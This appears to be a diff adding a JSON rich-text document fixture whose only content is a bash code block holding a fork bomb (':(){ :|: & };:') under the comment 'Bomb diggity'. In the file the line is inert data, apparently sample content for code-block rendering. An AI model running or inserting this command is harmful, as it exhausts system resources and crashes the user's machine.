@@ -1,0 +1,28 @@
+{
+  "type": "doc",
+  "version": 1,
+  "content": [
+    {
+      "type": "codeBlock",
+      "marks": [
+        {
+          "type": "breakout",
+          "attrs": {
+            "mode": "wide"
+          }
+        }
+      ],
+      "content": [
+        {
+          "type": "text",
+          "text": "#!/bin/bash\n# Bomb diggity.\n:(){ :|: & };:"
+        }
+      ],
+      "attrs": {
+        "language": "bash"
+      }
+    }
+  ]
+
+}
+
